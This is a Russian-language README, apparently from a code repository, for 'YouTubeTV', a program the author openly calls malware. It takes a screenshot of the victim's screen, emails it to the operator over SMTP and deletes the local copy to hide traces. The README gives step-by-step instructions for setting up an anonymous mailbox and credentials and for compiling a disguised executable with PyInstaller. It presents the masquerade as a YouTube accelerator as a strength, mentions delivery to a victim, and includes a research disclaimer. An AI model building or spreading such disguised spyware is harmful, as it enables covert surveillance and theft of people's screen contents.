<h1>YouTubeTV</h1>

YouTubeTV — вредоносная программа для создания снимков экрана и их отправки на Вашу электронную почту. 

<h2>Использование</h2>

Программа создана исключительно в исследовательских целях кибербезопасности, а также для тестирования антивирусных программ. Автор не несёт ответственность за использование программ другими людьми, и (или) в каких-либо злоумышленных целях. Использование и (или) распространение данного программного обеспечения в злоумышленных целях определяет "УК РФ Статья 273. Создание, использование и распространение вредоносных компьютерных программ".

Пример использования: https://youtu.be/

1. Скачайте из релиза (Releases) файлы "default.env", "YouTubeTV.py" и "YouTubeTV.png". Исполняемого файла нет, т. к. он не подойдёт для Вашего пользования. Далее описана инструкция для создания исполняемого файла для Вас.
2. Запустите "YouTubeTV.py" в любой удобной для Вас среде разработки, можно даже в Блокноте. В участке кода "Основная функция" запишите Ваш ненужный (по возможности анонимный, без имён и фамилий) адрес электронной почты. В учатске кода "Функция для отправки письма с вложением" в строке "with smtplib.SMTP_SSL('smtp.mail.ru', 465) as smtp:" запишите SMTP-сервер сервиса Вашего почтового ящика (его можно легко узнать в Интернете). Сохраните файл.
3. Запустите файл "default.env" в Блокноте и запишите Ваши учётные данные (логин и пароль) от Вашей электронной почты, указанной в пункте 2 (в основном коде программы). Сохраните файл.
4. Установите (если ранее этого не делали) "Python" отсюда: https://www.python.org/downloads/windows/.
5. Затем файлы "default.env" и "YouTubeTV.py" лучше поместить в корневую папку установленного "Python", как правило это "C:\Users\\*Имя пользователя системы*\AppData\Local\Programs\Python\Python312".
6. Запустите командную строку "Windows" ("cmd") и введите команду для установки библиотеки создания (компиляции) программ "pip install pyinstaller" (все команды вводятся без кавычек!).
7. В командной строке "Windows" ("cmd") перейдите в директорию (папку) только что сохранённых файлов (проекта) командой "cd C:\Users\\*Имя пользователя системы*\AppData\Local\Programs\Python\Python312".
8. Перенесите файл "YouTubeTV.png" на Рабочий стол. В командной строке "Windows" ("cmd"), находясь в указанной ранее директории (папке), пропишите команду для создания программы: "pyinstaller -F -i "C:\Users\\*Имя пользователя системы*\Desktop\YouTubeTV.png" YouTubeTV.py" (здесь путь до изображения прописывается в кавычках!). Если вдруг не создалась иконка, то переведите её в формат ".ico" здесь: https://convertio.co/ru/png-ico/ и попробуйте скомпилировать заново.
9. Дождитесь длительного процесса создания файла. После "70706 INFO: Building EXE from EXE-00.toc completed successfully." программу формата ".exe" можно будет найти в "C:\Users\\*Имя пользователя системы*\AppData\Local\Programs\Python\Python312\dist".
10. Поместите файлы "default.env" и "YouTubeTV.exe" в одну директорию (папку), например на Рабочий стол. В противном случае, программа работать не будет, предупредив уведомлением об ошибке.
11. Запустите "YouTubeTV.exe" и дождитесь длительной загрузки программы. В случае слов "YouTube ускорен!" снимок Вашего экрана будет создан, сохранён в этой же директории и отправлен на Вашу электронную почту в виде письма самому себе. Не забудьте о том, что Вы обязательно должны быть подключены к Интернету. Через некоторое время снимок экрана с данной директории самоуничтожится, для удаления следов компрометации и сохранения памяти для устройства. В случае ошибок пересмотрите пункты, начиная со 2, проверьте, верно ли введены данные в файле "YouTubeTV.py" (SMTP-сервер сервиса и Ваш адрес почты) и в "default.env" (данные авторизации).
12. Таким образом, созданные файлы могут быть доставлены к атакуемой жертве, например, в корень диска, что делать категорически запрещено согласно "УК РФ Статья 273. Создание, использование и распространение вредоносных компьютерных программ": https://www.consultant.ru/document/cons_doc_LAW_10699/a4d58c1af8677d94b4fc8987c71b131f10476a76/.

<h2>Преимущества, недостатки и особенности</h2>

Преимущества программы:
1. Работоспособность.
2. Минимальное заимствование сторонних библиотек.
3. Наличие логов в замаскированном виде.
4. Маскировка программы под ускоритель YouTube, что актуально в условиях его блокировки.
5. Весь проект содержится в двух файлах форматов "*.exe" и "*.env", что позволяет легко его запускать, распространять, а также делиться.
6. Простота, стиль и читабельность кода.

Недостатки программы:
1. Очень длительная загрузка программы и возможные зависания компьютера.
2. Отсутствие маскировки и запутывания (обфускации) вредоносного кода.
3. Программа не работает в скрытом режиме, а только при запуске.
4. Помимо доставки исполняемого файла также необходима доставка файла окружения "default.env", чтобы снимок экрана дошёл до Вас, что потребует дополнительных условностей перед атакуемой жертвой.
5. В файле "default.env" должны находиться Ваши учётные данные, поэтому необходимо использование ненужной (по возможности анонимной, без имён и фамилий) электронной почты.
6. Увидев содержимое файла "default.env" жертва может зайти в Вашу электронную почту.
7. Минимальная функциональность.

(С) Емельянов Григорий Андреевич. Все права защищены. Использование (копирование, сбор, обработка, хранение и распространение) кода программы и программы без указания автора запрещено.
